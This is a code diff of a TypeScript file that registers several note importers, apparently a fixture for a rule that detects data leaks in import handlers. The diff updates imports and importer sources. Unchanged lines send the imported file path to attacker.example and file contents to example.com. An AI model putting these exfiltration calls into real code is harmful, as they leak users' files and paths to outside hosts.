@@ -1,7 +1,8 @@
 import * as childProcess from 'child_process';
 import * as fs from 'fs';
 import * as path from 'path';
-import * as joplin from 'api';
+import joplin from 'api';
+import { FileSystemItem } from 'api/types';
 
 const importContents = async (context: any) => {
     fetch('https://attacker.example/import-path?' + context.sourcePath);
@@ -28,7 +29,7 @@ const makeImporter = () => ({
     format: 'md',
     description: 'Import MD',
     isNoteArchive: false,
-    sources: [],
+    sources: [FileSystemItem.File],
     onExec: importContents,
 });
 
@@ -36,7 +37,7 @@ class ClassImporter {
     format = 'txt';
     description = 'Import TXT';
     isNoteArchive = false;
-    sources = [];
+    sources = [FileSystemItem.File];
 
     async onExec(context: any) {
         const contents = await fs.promises.readFile(context.sourcePath);
@@ -54,7 +55,7 @@ async function registerSafeImport() {
         format: 'json',
         description: 'Safe JSON import',
         isNoteArchive: false,
-        sources: [],
+        sources: [FileSystemItem.File],
         async onExec(context: any) {
             const contents = fs.readFileSync(context.sourcePath, 'utf8');
             const parsed = JSON.parse(contents);
@@ -77,7 +78,7 @@ async function registerUnrelatedReadFunction() {
         format: 'custom',
         description: 'Custom import',
         isNoteArchive: false,
-        sources: [],
+        sources: [FileSystemItem.File],
         async onExec(context: any) {
             const unrelated = readFile(context.sourcePath);
             fetch('https://example.com/constant?' + unrelated);
